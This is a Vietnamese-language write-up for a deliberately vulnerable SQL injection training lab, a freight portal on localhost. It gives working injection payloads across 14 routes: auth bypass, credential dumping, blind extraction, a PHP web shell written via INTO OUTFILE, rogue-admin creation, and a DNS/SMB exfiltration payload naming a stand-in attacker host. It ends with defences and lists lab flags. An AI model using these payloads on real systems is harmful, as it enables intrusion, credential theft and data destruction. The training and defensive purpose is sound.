# Writeup — Lab SQL Injection "IlFreight Logistics"

> **Tài liệu đào tạo — chỉ dùng trong môi trường lab được uỷ quyền.**
> Toàn bộ payload dưới đây đã được **kiểm chứng thực tế** trên lab (http://localhost:8088).
> Lab cố ý để lỗ (vulnerable-by-design): mọi web query đến database đều khai thác được SQLi.

---

## Mục lục

1. [Tổng quan & thiết lập](#1-tổng-quan--thiết-lập)
2. [Bản đồ toàn bộ vị trí lỗ hổng](#2-bản-đồ-toàn-bộ-vị-trí-lỗ-hổng)
3. [Quy ước payload & comment](#3-quy-ước-payload--comment)
4. [KHAI THÁC THEO KỸ THUẬT](#4-khai-thác-theo-kỹ-thuật)
   - [4.1 In-band · UNION-based](#41-in-band--union-based)
   - [4.2 In-band · Error-based](#42-in-band--error-based)
   - [4.3 Blind · Boolean-based + Auth Bypass](#43-blind--boolean-based--auth-bypass)
   - [4.4 Blind · Time-based](#44-blind--time-based)
   - [4.5 Out-of-band (OOB) + Đọc/Ghi file → RCE](#45-out-of-band-oob--đọcghi-file--rce)
5. [KHAI THÁC THEO LOẠI QUERY](#5-khai-thác-theo-loại-query)
   - [5.1 SELECT](#51-select)
   - [5.2 INSERT](#52-insert)
   - [5.3 UPDATE](#53-update)
   - [5.4 DELETE](#54-delete)
   - [5.5 CREATE](#55-create)
   - [5.6 Stacked Query (multi_query)](#56-stacked-query-multi_query)
6. [Enumeration đầy đủ database](#6-enumeration-đầy-đủ-database)
7. [Bảng flags](#7-bảng-flags)
8. [Phòng chống](#8-phòng-chống)

---

## 1. Tổng quan & thiết lập

**Bối cảnh:** portal quản lý cảng biển & vận tải `IlFreight Logistics`.

```bash
cd sqli-lab
docker compose up -d --build      # chạy lab
# mở http://localhost:8088
docker compose down -v            # reset toàn bộ dữ liệu về sạch
```

**Tài khoản mẫu** (không cần biết password — mục tiêu là bypass/dump qua SQLi):

| Username | Password | Role |
|---|---|---|
| `admin` | `p@ssw0rd` | admin |
| `jsmith` | `Spring2024!` | customer |
| `awong` | `Hongkong88` | customer |
| `mgarcia` | `Barca#2010` | staff |

**Schema:**

```
ilfreight (DB app chạy)                dev (mục tiêu enumeration liên-DB)
├── users (id, username, password,     ├── credentials (id, username,
│          email, role, api_key, …)    │                 password_hash, api_key)
├── ports (id, code, city,             └── flags (id, technique, flag)
│          country, volume)
├── shipments (id, tracking_no,
│              port_code, status, customer_id)
├── comments (id, shipment_id, user_id, content, created_at)
└── news (id, title, body, published_at)
```

**Cấu hình cố ý để lỗ:** `root` + `FILE` privilege · `secure_file_priv=''` · `display_errors=On` · không dùng prepared statement · `/admin/console` dùng `mysqli_multi_query()`.

---

## 2. Bản đồ toàn bộ vị trí lỗ hổng

| # | Route | Tham số | Query nền | Số cột | Kỹ thuật khả dụng |
|---|---|---|---|---|---|
| V1 | `GET /ports` | `q` | `SELECT ... WHERE code LIKE '%q%'` | 4 | UNION, OOB read/write |
| V2 | `GET /ports/{code}` | `{code}` | `SELECT ... WHERE code='{code}'` | 4 | Error, Boolean, Time |
| V3 | `POST /login` | `username`, `password` | `SELECT ... WHERE username='' AND password=''` | — | Boolean, Auth bypass |
| V4 | `GET /api/track` | `tracking` | `SELECT ... WHERE tracking_no=''` | — | Time (response không lộ dữ liệu) |
| V5 | `GET /account` | `order` | `SELECT ... ORDER BY {order}` | — | Error (ORDER BY expr) |
| V6 | `POST /account/update` | `email` | `UPDATE users SET email='' WHERE id=…` | — | UPDATE inject, Error |
| V7 | `GET /shipments/{id}` | `{id}` | `SELECT ... WHERE id={id}` | — | UNION/Error (số) |
| V8 | `POST /shipments/{id}/comments` | `content` | `INSERT INTO comments … VALUES(…,'content')` | — | INSERT inject, Error |
| V9 | `POST /comments/{id}/delete` | `{id}` | `DELETE FROM comments WHERE id={id}` | — | DELETE inject |
| V10 | `GET /admin` | `customer` | `SELECT ... WHERE username LIKE '%…%'` | 3 | UNION/Error/Boolean |
| V11 | `POST /admin/reports/export` | `report_name` | `CREATE TABLE report_{name} AS SELECT …` | — | CREATE inject |
| V12 | `GET /admin/console` | `filter` | `SELECT tracking_no, {filter} FROM shipments` (multi_query) | — | **Stacked** (mọi loại) |
| V13 | `GET /reports/download` | `ref` | `SELECT LOAD_FILE(CONCAT('/var/lib/mysql-files/','ref'))` | — | OOB, đọc file |
| V14 | `GET /news` | `id` | `SELECT id,title,body … WHERE id={id}` | 3 | UNION/Error (số) |

> **Ghi chú số cột:** bảng hiển thị của `/ports` có 4 cột → UNION 4 cột. Cột thứ 1 (`code`) hiển thị được, nên có thể đặt payload ở cột 1–4. `/news` và `/admin` là các điểm phụ với số cột khác (3).

---

## 3. Quy ước payload & comment

- `-- -` : line comment của MySQL, **cần khoảng trắng sau `--`**; thêm `-` cuối để nhìn rõ dấu space (trong URL space ↔ `+`/`%20`).
- Khi payload đặt trong **URL** (GET), cần URL-encode: `'`→`%27`, space→`%20`, `#`→`%23`.
- `0x7e` = ký tự `~`, dùng đánh dấu vị trí dữ liệu trong thông báo lỗi (Error-based).
- Tất cả ví dụ dưới đây là **payload thô**; khi bỏ vào URL trên trình duyệt nhớ encode.

---

## 4. KHAI THÁC THEO KỸ THUẬT

### 4.1 In-band · UNION-based

**Vị trí:** V1 `GET /ports?q=` (4 cột, cột 1 hiển thị).

**Bước 1 — Phát hiện (Discovery).** Chèn một single quote:

```
/ports?q=cn'
```
→ Trang trả về SQL error ⇒ có khả năng dính SQLi.

**Bước 2 — Đếm số cột.** Dùng `ORDER BY` tăng dần cho tới khi lỗi:

```
cn' ORDER BY 4-- -      → OK
cn' ORDER BY 5-- -      → Unknown column '5'  ⇒ có 4 cột
```

Hoặc dùng UNION:

```
cn' UNION SELECT 1,2,3,4-- -    → trả về kết quả ⇒ đúng 4 cột
```

**Bước 3 — Kiểm tra dữ liệu thật & fingerprint:**

```
cn' UNION SELECT @@version,2,3,4-- -
```
→ Hiển thị `10.11.x-MariaDB` ⇒ đọc được dữ liệu thật, DBMS là MariaDB.

**Bước 4 — Dump dữ liệu (đã kiểm chứng):**

```
cn' UNION SELECT username,password_hash,api_key,4 FROM dev.credentials-- -
```
→ Trả về `dev_admin / 392037dbba51f692776d6cefb6dd546d / DEV-KEY-super-secret-0xC0FFEE`.

Dump users của app:

```
cn' UNION SELECT username,password,role,api_key FROM users-- -
```

**Điểm phụ (V14 `/news?id=`, 3 cột, kiểu số — không cần quote):**

```
/news?id=0 UNION SELECT 1,username,password FROM users-- -
```

---

### 4.2 In-band · Error-based

**Vị trí:** V2 `GET /ports/{code}` — `display_errors=On` + in `mysqli_error()`.

Ép hàm XPath lỗi để nhét dữ liệu vào chính thông báo lỗi:

```
/ports/CN SHA' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
```
→ `XPATH syntax error: '~ilfreight'` (rò tên database).

```
/ports/CN SHA' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
```
→ rò version.

Dump credential admin (giới hạn ~32 ký tự của `extractvalue`, dùng `SUBSTRING` nếu dài):

```
/ports/x' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))-- -
```
→ `~p@ssw0rd`.

**Điểm phụ (V5 `GET /account?order=` — Error qua ORDER BY, cần đăng nhập):**

```
/account?order=(extractvalue(1,concat(0x7e,(SELECT api_key FROM users WHERE username='admin'))))
```
→ rò `ILF-ADM-…`.

---

### 4.3 Blind · Boolean-based + Auth Bypass

**Vị trí:** V3 `POST /login` — trang chỉ phản hồi "thành công (redirect `/account`)" hoặc "thất bại (ở lại trang, 200)". Không lộ dữ liệu ⇒ suy luận qua TRUE/FALSE.

**Auth bypass (đã kiểm chứng):**

| `username` | `password` | Query rút gọn | Kết quả |
|---|---|---|---|
| `admin'-- -` | (bất kỳ) | `... WHERE username='admin'-- ...` | **Đăng nhập = admin** |
| `' OR '1'='1' -- -` | (bất kỳ) | trả toàn bộ user → hàng đầu | Đăng nhập |

> Lưu ý: `' OR '1'='1` (không comment) **không** đủ, vì AND có precedence cao hơn OR: `username='' OR '1'='1' AND password='x'` → phần `'1'='1' AND password='x'` là FALSE. Dùng `admin'-- -` là chắc chắn nhất.

**Boolean char-by-char (dò dữ liệu qua điều kiện TRUE/FALSE):**

```
admin' AND SUBSTRING(database(),1,1)='i'-- -     → TRUE  → redirect /account
admin' AND SUBSTRING(database(),1,1)='z'-- -     → FALSE → ở lại /login
```

Dò độ dài & từng ký tự password admin:

```
admin' AND LENGTH((SELECT password FROM users WHERE username='admin'))=8-- -
admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='p'-- -
```
Có thể tự động hoá bằng sqlmap hoặc script nhị phân (binary search theo `ASCII()`).

**Điểm phụ (V10 `/admin?customer=`):** vừa Boolean, vừa UNION/Error (3 cột).

---

### 4.4 Blind · Time-based

**Vị trí:** V4 `GET /api/track?tracking=` — API JSON chỉ trả `{found:true/false}`, **nuốt lỗi**, không lộ dữ liệu ⇒ chỉ còn cách đo **độ trễ**.

**Xác nhận có SQLi (đã kiểm chứng):**

```
/api/track?tracking=ILF1042CN' AND SLEEP(5)-- -
```
→ Response trễ ≥5s. (Dùng `OR SLEEP(5)` sẽ trễ ~5s × số hàng quét.)

**Dò dữ liệu theo điều kiện:**

```
ILF1042CN' AND IF(SUBSTRING(database(),1,1)='i',SLEEP(3),0)-- -
```
→ Nếu trễ ⇒ ký tự đầu của database là `i`.

Trích password admin từng ký tự:

```
z' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p',SLEEP(3),0)-- -
```

Fingerprint blind bằng `SLEEP` (theo bảng bài giảng): nếu payload `SELECT SLEEP(5)` làm trễ ⇒ MySQL/MariaDB.

---

### 4.5 Out-of-band (OOB) + Đọc/Ghi file → RCE

Điều kiện đã bật sẵn: user `root` có `FILE` privilege, `secure_file_priv=''`.

**Xác nhận quyền (qua V1):**

```
cn' UNION SELECT user(),super_priv,3,4 FROM mysql.user WHERE user='root'-- -
cn' UNION SELECT grantee,privilege_type,3,4 FROM information_schema.user_privileges WHERE privilege_type='FILE'-- -
```

**Đọc file — Reading files (đã kiểm chứng):**

```
cn' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4-- -
```
→ Trả về nội dung `/etc/passwd` (`root:x:0:0:...`).

Đọc source code để tìm thêm lỗ hổng:

```
cn' UNION SELECT LOAD_FILE('/var/www/html/lib/db.php'),2,3,4-- -
```

**Ghi web shell — Writing files → RCE (đã kiểm chứng):**

MySQL (container `db`) ghi vào volume chia sẻ `/var/lib/mysql-files/`, được web phục vụ tại `/files/`.

```
cn' UNION SELECT '<?php system($_REQUEST[0]); ?>',2,3,4 INTO OUTFILE '/var/lib/mysql-files/shell.php'-- -
```
Rồi thực thi lệnh:

```
http://localhost:8088/files/shell.php?0=id
```
→ `uid=33(www-data) gid=33(www-data) groups=33(www-data)` ⇒ **RCE**.

> Mẹo: tránh junk `2,3,4` bị ghi kèm bằng cách dùng `"",'<?php…?>',"",""` (chuỗi rỗng thay số).

**Out-of-band exfil (V13 `GET /reports/download?ref=`):**

Endpoint không in dữ liệu ra ⇒ đẩy dữ liệu ra kênh ngoài (DNS/SMB). Ép `LOAD_FILE` resolve một đường dẫn UNC mang theo dữ liệu, thay `attacker.oob` bằng Collaborator/interactsh/host của bạn:

```
x' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.oob\\a')),2,3,4-- -
```
→ Backend phát DNS/SMB lookup `p@ssw0rd.attacker.oob` ra ngoài → collector hứng được dữ liệu.

> **Lưu ý kỹ thuật (trung thực):** OOB thuần DNS qua `LOAD_FILE` UNC là đặc trưng của MSSQL/Windows; trên MariaDB/Linux đây là minh hoạ khái niệm kênh ngoài. Trong lab, ưu tiên chứng minh OOB bằng cặp **đọc file (`LOAD_FILE`) + ghi file (`INTO OUTFILE`)** vốn hoạt động chắc chắn 100%.

---

## 5. KHAI THÁC THEO LOẠI QUERY

Yêu cầu: 5 loại query `SELECT / INSERT / UPDATE / DELETE / CREATE` đều khai thác được.

### 5.1 SELECT

Đã trình bày đầy đủ ở §4 (V1, V2, V3, V4, V5, V7, V10, V14). SELECT là bề mặt tấn công lớn nhất — hỗ trợ cả 5 kỹ thuật.

### 5.2 INSERT

**Vị trí:** V8 `POST /shipments/{id}/comments`, tham số `content` nối vào `VALUES(…, '{content}')`.

Query nền:
```sql
INSERT INTO comments (shipment_id, user_id, content) VALUES (1, 2, '{content}')
```

**Error-based trong lúc INSERT (đã kiểm chứng):**

```
content = t'||(SELECT extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin'))))||'
```
→ Thông báo lỗi chứa `~p@ssw0rd`. (`||` nối chuỗi; cấu trúc giữ query hợp lệ về mặt cú pháp trước khi hàm lỗi kích hoạt.)

**Đóng sớm bộ VALUES để chèn thêm bản ghi tuỳ ý** (bảng chèn 3 cột: `shipment_id, user_id, content`):

```
content = evil'),(1,1,'injected row
```
→ Query thành `INSERT ... VALUES (1, 2, 'evil'),(1,1,'injected row')` — chèn thêm một comment giả mạo `user_id=1` (admin).

### 5.3 UPDATE

**Vị trí:** V6 `POST /account/update`, tham số `email` nối vào `SET`.

Query nền:
```sql
UPDATE users SET email = '{email}' WHERE id = <uid>
```

**Tự nâng quyền lên admin (đã kiểm chứng — đăng nhập bằng jsmith):**

```
email = x@x', role='admin' WHERE username='jsmith'-- -
```
→ `role` của jsmith thành `admin` (bỏ qua `WHERE id` gốc bằng comment). Sau đó reload `/account` sẽ thấy vai trò `admin` và mở khoá `/admin`.

**Đổi email/mật khẩu của user khác:**

```
email = pwn@x' WHERE username='admin'-- -
```

**Error-based qua UPDATE:**

```
email = x@x' WHERE id=1 AND extractvalue(1,concat(0x7e,version()))-- -
```

### 5.4 DELETE

**Vị trí:** V9 `POST /comments/{id}/delete`, `{id}` nối vào `WHERE`.

Query nền:
```sql
DELETE FROM comments WHERE id = {id}
```

**Xoá hàng loạt (đã kiểm chứng):**

```
/comments/0 OR 1=1/delete       → xoá TOÀN BỘ comments (3 bản ghi)
```

Xoá có mục tiêu:

```
/comments/0 OR shipment_id=1/delete    → xoá mọi comment của đơn hàng 1
```

### 5.5 CREATE

**Vị trí:** V11 `POST /admin/reports/export`, `report_name` nối vào `CREATE TABLE report_{name} AS SELECT …`.

Query nền:
```sql
CREATE TABLE report_{name} AS SELECT tracking_no, status FROM shipments
```

**Hijack CTAS để sao chép dữ liệu nhạy cảm (đã kiểm chứng):**

```
report_name = loot AS SELECT * FROM dev.credentials-- -
```
→ Tạo bảng `report_loot` chứa toàn bộ `dev.credentials`. Đọc lại qua V1:

```
z' UNION SELECT username,password_hash,api_key,4 FROM report_loot-- -
```
→ dump `dev_admin`, `backup_svc`.

Nhét nội dung file vào bảng (đọc lại qua cột `data`):

```
report_name = pf AS SELECT LOAD_FILE('/etc/passwd') AS data-- -
```
→ Tạo `report_pf(data)`. Đọc lại:
```
z' UNION SELECT data,2,3,4 FROM report_pf-- -
```

### 5.6 Stacked Query (multi_query)

**Vị trí:** V12 `GET /admin/console?filter=` — dùng `mysqli_multi_query()` nên **một injection chạy chồng nhiều câu lệnh** ngăn bằng `;`.

Query nền:
```sql
SELECT tracking_no, {filter} FROM shipments
```

> **Quan trọng:** phải giữ **statement 1 hợp lệ** rồi mới stack. Kết thúc statement 1 bằng `FROM shipments`, sau đó `;` + lệnh mới, và `-- -` để nuốt phần `FROM shipments` mà template gắn ở cuối.

**INSERT tạo rogue admin (đã kiểm chứng):**

```
filter = status FROM shipments; INSERT INTO users(username,password,role) VALUES('h4x0r','pwned','admin')-- -
```
Xác nhận qua V1:
```
z' UNION SELECT username,password,role,4 FROM users WHERE username='h4x0r'-- -
```

**Các biến thể stacked khác:**

```
status FROM shipments; UPDATE users SET role='admin' WHERE username='jsmith'-- -
status FROM shipments; DELETE FROM comments-- -
status FROM shipments; CREATE TABLE pwned AS SELECT * FROM dev.credentials-- -
status FROM shipments; DROP TABLE report_loot-- -
```

> Đây chính là điểm bài giảng lưu ý: MySQL mặc định **không** cho stacked qua `mysqli_query()`, nhưng lập trình viên dùng **sai** API `mysqli_multi_query()` khiến stacked khả thi.

---

## 6. Enumeration đầy đủ database

Chuỗi enumerate chuẩn qua `INFORMATION_SCHEMA` (dùng V1 làm ví dụ, 4 cột):

**Liệt kê database:**
```
cn' UNION SELECT schema_name,2,3,4 FROM information_schema.schemata-- -
```
→ `ilfreight`, `dev` (bỏ qua `mysql`, `information_schema`, `performance_schema`, `sys`).

**DB hiện tại:**
```
cn' UNION SELECT database(),2,3,4-- -          → ilfreight
```

**Liệt kê bảng trong `dev`:**
```
cn' UNION SELECT table_name,table_schema,3,4 FROM information_schema.tables WHERE table_schema='dev'-- -
```
→ `credentials`, `flags`.

**Liệt kê cột của `credentials`:**
```
cn' UNION SELECT column_name,table_name,table_schema,4 FROM information_schema.columns WHERE table_name='credentials'-- -
```
→ `id`, `username`, `password_hash`, `api_key`.

**Dump dữ liệu (dùng operator dấu chấm `dev.credentials`):**
```
cn' UNION SELECT username,password_hash,api_key,4 FROM dev.credentials-- -
```

---

## 7. Bảng flags

Lấy flag tương ứng mỗi kỹ thuật (bảng `dev.flags`) để tự chấm điểm:

```
cn' UNION SELECT technique,flag,3,4 FROM dev.flags-- -
```

| technique | flag |
|---|---|
| inband-union | `ILF{un10n_b4s3d_dump_c0mpl3t3}` |
| inband-error | `ILF{3rr0r_b4s3d_3xtr4ctv4lu3}` |
| blind-boolean | `ILF{bl1nd_b00l34n_ch4r_by_ch4r}` |
| blind-time | `ILF{t1m3_b4s3d_sl33p_5s}` |
| out-of-band | `ILF{00b_3xf1l_v14_dns_ch4nn3l}` |
| stacked-query | `ILF{st4ck3d_mult1_qu3ry_pwn3d}` |
| file-read | `ILF{l04d_f1l3_r34d_3tc_p4sswd}` |
| file-write | `ILF{1nt0_0utf1l3_w3bsh3ll_rc3}` |

---

## 8. Phòng chống

Tất cả lỗ hổng ở trên đều bắt nguồn từ **nối chuỗi user input thẳng vào SQL query**. Cách khắc phục (theo thứ tự ưu tiên):

**1. Parameterized Queries / Prepared Statements (mạnh nhất).**
```php
$stmt = mysqli_prepare($conn, "SELECT * FROM users WHERE username=? AND password=?");
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
```
Dữ liệu không bao giờ được coi là code. Áp dụng cho V1–V10, V14.

**2. Input Validation (allow-list).** Với dữ liệu có định dạng cố định:
- `port_code` chỉ gồm chữ cái + khoảng trắng → regex `^[A-Za-z\s]+$`.
- `id`, `shipment_id`, `comment_id` phải là số nguyên → ép `intval()` **trước khi** ghép.
- `order` (ORDER BY) phải nằm trong danh sách cột cho phép (`id`, `tracking_no`, `status`), không nhận biểu thức tuỳ ý.
- Tên bảng trong CREATE (V11): allow-list ký tự `[A-Za-z0-9_]`, không cho khoảng trắng/`AS`/`SELECT`.

**3. Không dùng `mysqli_multi_query()`** ở V12 — thay bằng một query đơn + prepared statement. Loại bỏ hoàn toàn stacked injection.

**4. Least Privilege.**
- App **không** dùng `root`. Tạo user riêng chỉ có `SELECT`/`INSERT`/`UPDATE`/`DELETE` trên đúng các bảng cần thiết, **không** cấp `FILE` → chặn đọc/ghi file & OOB.
- `secure_file_priv` đặt về `NULL` (hoặc thư mục vô hại) → chặn `LOAD_FILE`/`INTO OUTFILE`.

**5. Không lộ lỗi ra front-end.** `display_errors=Off` ở production; log lỗi nội bộ → vô hiệu Error-based. API không "nuốt" lỗi rồi vẫn chạy query độc hại.

**6. WAF (phòng thủ theo lớp).** ModSecurity/Cloudflare chặn các mẫu như `UNION SELECT`, `INFORMATION_SCHEMA`, `SLEEP(`, `LOAD_FILE`, `INTO OUTFILE`. Là lớp bổ sung, **không thay thế** prepared statement.

> **Kết luận:** Prepared statement + least privilege giải quyết tận gốc toàn bộ 14 vị trí lỗ hổng trong lab. Validation, ẩn lỗi và WAF là các lớp phòng thủ bổ sung.
